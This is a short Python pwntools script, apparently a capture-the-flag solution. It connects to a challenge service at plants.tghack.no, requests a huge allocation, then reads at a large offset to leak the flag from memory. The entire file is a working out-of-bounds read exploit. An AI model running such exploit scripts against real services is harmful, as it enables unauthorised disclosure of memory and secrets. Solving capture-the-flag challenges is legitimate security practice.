from pwn import *

#p = process("./chall")
p = remote("plants.tghack.no",6004)
p.recvuntil("> ")
p.sendline("1")
p.recvuntil("size: ")
p.sendline("1000000")
p.recvuntil("data: ")
p.sendline("1")
p.recvuntil("> ")
p.sendline("3")
p.recvuntil("index: ")
p.sendline("0")
p.recvuntil("offset: ")
p.sendline("1015792")
flag = p.recvline()
print flag
